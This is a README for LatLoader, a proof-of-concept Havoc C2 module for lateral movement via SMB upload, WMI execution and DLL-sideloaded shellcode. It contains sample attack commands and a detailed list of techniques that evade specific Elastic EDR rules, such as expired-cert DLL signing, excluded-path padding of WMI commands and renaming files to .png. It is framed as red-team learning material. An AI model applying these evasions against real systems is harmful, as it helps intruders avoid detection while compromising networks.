# LatLoader
LatLoader is a PoC module to demonstrate automated lateral movement with the Havoc C2 framework. The main purpose of this project is to help others learn BOF and Havoc module development. This project can also help others understand basic EDR rule evasions, particularly when performing lateral movement.

The `sideload` subcommand is the full-featured PoC of this module. It will attempt to perform lateral movement via DLL sideloading while evading default Elastic EDR rules. For a full list of every rule evaded by this module and how it was done, please see the below section titled [Elastic EDR Rule Evasions](https://github.com/icyguider/wmiexeccpp#elastic-edr-rule-evasions).

Video demo w/ Elastic EDR: [PLACEHOLDER]

## Dependencies/Basic Usage

This module was designed to work on Linux systems with `mingw-w64` installed. Additionally, you must have [osslsigncode](https://github.com/mtrojnar/osslsigncode) installed to provide cert signing for the DLL utilized by the `sideload` subcommand. Once all dependencies are installed, simply type `make` and then load the module into Havoc using the script manager. To view help in Havoc, run `help LatLoader`. To view help for subcommands, run `help [subcommand]`.

[HELP PLACEHOLDER]

## Usage/Subcommands

The LatLoader module contains 5 different subcommands. The first two, `rupload` and `exec`, serve as the main mechanism for executing the provided BOFs. The 3 other subcommands (`load`, `xorload`, & `sideload`) combine the previous two in order to perform automated lateral movement.

The `rupload` command can be used to upload a local file to a remote system via SMB using the `writefileBOF.c` BOF like so:
```
LatLoader rupload dc1 /root/demon.x64.exe C:\Windows\Temp\test.exe
```
[RUPLOAD PLACEHOLDER]

The `exec` subcommand can be used to execute a command on a remote system via WMI using the `wmiBOF.cpp` BOF like so:
```
LatLoader exec dc1 "cmd.exe /c whoami > C:\poc.txt"
```
[EXEC PLACEHOLDER]

The `load` subcommand combines the two subcommands above to transfer a specified exe to the remote host via SMB and execute it over WMI:
```
LatLoader load dc1 /root/test.exe
```
[LOAD PLACEHOLDER]

The `xorload` subcommand will perform lateral movement using a simple shellcode loader. This is designed to bypass basic AV detections:
```
LatLoader xorload dc1 /root/demon.x64.bin
```
[XORLOAD PLACEHOLDER]

Finally, the `sideload` subcommand will perform lateral movement by DLL sideloading a simple shellcode loader. Actions were also taken to evade various elastic EDR rules.
```
LatLoader sideload dc1 /root/demon.x64.bin
```
[SIDELOAD PLACEHOLDER]

## Elastic EDR Rule Evasions

The following is a list of various Elastic EDR rules that could alert when performing lateral movement. I have provided what steps were taken to evade each rule. All evasions described here were implemented in the `sideload` subcommand to demonstrate how they can be combined to create a fully functional PoC.

----
#### [Remote Execution via File Shares](https://www.elastic.co/guide/en/security/current/remote-execution-via-file-shares.html)
**Description:** Identifies the execution of a file that was created by the virtual system process. This may indicate lateral movement via network file shares.

**Bypass:** This rule was bypassed by performing DLL sideloading.

----
#### [Malicious Behavior Detection Alert: Unsigned File Execution via Network Logon](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_unsigned_file_execution_via_network_logon.toml)
**Description:** Identifies the execution of a recently created file that is unsigned or untrusted and from a remote network logon. This may indicate lateral movement via remote services.

**Bypass:** This rule was bypassed by performing DLL sideloading.

----
#### [Malicious Behavior Detection Alert: Execution of a File Dropped from SMB](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_execution_of_a_file_dropped_from_smb.toml)
**Description:** Identifies the execution of a file that was created by the virtual system process and subsequently executed. This may indicate lateral movement via network file shares.

**Bypass:** This rule was bypassed by executing the transferred file using cmd.exe /c. This evades the rule because the file is not executed directly, but instead by a trusted binary.

----
#### [WMI Incoming Lateral Movement](https://www.elastic.co/guide/en/security/current/wmi-incoming-lateral-movement.html)
**Description:** Identifies processes executed via Windows Management Instrumentation (WMI) on a remote host. This could be indicative of adversary lateral movement, but could be noisy if administrators use WMI to remotely manage hosts.

**Bypass:** This rule was bypassed by including a path in our command that the rule excludes. As seen in the query, `C:\\Windows\\CCMCache\\*` is one of these directories, which was appended to each wmi command like so: `&& echo --path C:\\Windows\\CCMCache\\cache`

----
#### [Malicious Behavior Prevention Alert: DLL Side Loading via a Copied Microsoft Executable](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_dll_side_loading_via_a_copied_microsoft_executable.toml)
**Description:** Identifies when a Microsoft signed binary is copied to a directory and shortly followed by the loading of an unsigned DLL from the same directory. Adversaries may opt for moving Microsoft signed binaries to a random directory and use them as a host for malicious DLL sideloading during the installation phase.

**Bypass:** This rule was bypassed by signing the DLL sideloader with an expired cert. The expired cert was obtained from here: https://github.com/utoni/PastDSE/tree/main/certs

----
#### [Malicious Behavior Prevention Alert: VirtualProtect API Call from an Unsigned DLL](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml)
**Description:** Identifies the load of an unsigned or untrusted DLL by a trusted binary followed by calling VirtualProtect API to change memory permission to execute or write. This may indicate execution via DLL sideloading to perform code injection.

**Bypass:** This rule was bypassed by signing the DLL sideloader with an expired cert. The expired cert was obtained from here: https://github.com/utoni/PastDSE/tree/main/certs

----
#### [Potential Lateral Tool Transfer via SMB Share](https://www.elastic.co/guide/en/security/current/potential-lateral-tool-transfer-via-smb-share.html)
**Description:** Identifies the creation or change of a Windows executable file over network shares. Adversaries may transfer tools or other files between systems in a compromised environment.

**Bypass:** This rule was bypassed by creating the file via SMB with a safe extension like .png, and then making a copy of the file with it's real extension via WMI.

----
#### [Malicious Behavior Detection Alert: ImageLoad of a File dropped via SMB](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_imageload_of_a_file_dropped_via_smb.toml)
**Description:** Identifies the transfer of a library via SMB followed by loading it into commonly DLL proxy execution binaries such as rundll32, regsvr32 and shared services via svchost.exe. This may indicate an attempt to remotely execute malicious code.

**Bypass:** This rule was bypassed by creating the file via SMB with a safe extension like .png, and then making a copy of the file with it's real extension via WMI.

----
## Standalone binaries

I have also provided standalone versions of the BOFs used in this project. These could be useful if you are unfamiliar with BOF development and would like to learn by comparing a normal program to it's BOF counterpart.

`wmiexec.cpp` is the standalone binary for command execution via WMI. It can be compiled with mingw like so:
```
x86_64-w64-mingw32-g++ wmiexec.cpp -I include -l oleaut32 -l ole32 -l wbemuuid -w -static -o /share/wmiexec.exe
```

The exe can then be transferred to the target and executed like so, providing arguments via the cli:
```
.\wmiexec.exe dc1 'cmd.exe /c whoami > c:\test.txt'
```

`writefile.c` is the standalone binary for file transfer via SMB. It can be compiled with mingw like so:
```
x86_64-w64-mingw32-gcc writefile.c -w -static -o /share/writefile.exe
```

The exe can then be transferred to the target and executed like so, providing arguments via the cli:
```
.\writefile.exe .\test.txt \\dc1\C$\poc.txt
```

## Notes
* This project is a PoC meant for learning purposes. Never use this in a real world environment. It was not designed for that and you will most definitely get burned unless you heavily modify the tool.
* The default DLL sideloader utilizes the [HWSyscalls](https://github.com/ShorSec/HWSyscalls) project to perform a single `NtAllocateVirtualMemory` call using hardware breakpoints. This is not effective against any EDRs that rely on kernel callbacks for detecting winapi usage (Elastic, MDE, etc). However, I have included it as a PoC to demonstrate how it could be used against other EDRs which still rely on hooking. If you would like to use a version of the sideloader without HWBP syscalls, simply modify the makefile to compile `sideloader.c` instead of `sideloader.cpp`.
* If you are looking to achieve 0 alerts by Elastic when using `sideload`, you must account for Elastic's in memory detection [yara rule](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Havoc.yar) for Havoc. This can be bypassed by modifying the Havoc framework itself with relative ease. I will leave the specifics of this process to the reader. ;)

## Greetz/Credit
* [@C5spider](https://twitter.com/C5pider), [@s4ntiago_p](https://twitter.com/s4ntiago_p), and all other contributors to the [Havoc C2 Framework](https://github.com/HavocFramework/Havoc).
* [@Yaxser](https://twitter.com/Yas_o_h) for their [wmiexec BOF](https://github.com/Yaxser/CobaltStrike-BOF/blob/master/WMI%20Lateral%20Movement/WMI-ProcessCreate.cpp) which was lightly modified for use in this project.
* [@dec0ne](https://twitter.com/dec0ne) and [@Idov31](https://twitter.com/Idov31) for [HWSyscalls](https://github.com/ShorSec/HWSyscalls) utilized by the DLL sideloader.
* [Elastic](https://www.elastic.co) for allowing anyone to test their EDR for free and for making their default rules public.
* [Microsoft's Online Documentation](https://learn.microsoft.com) for teaching me all about windows programming and internals. They also provide excellent example code that I and others gladly take and adopt for our offensive needs.
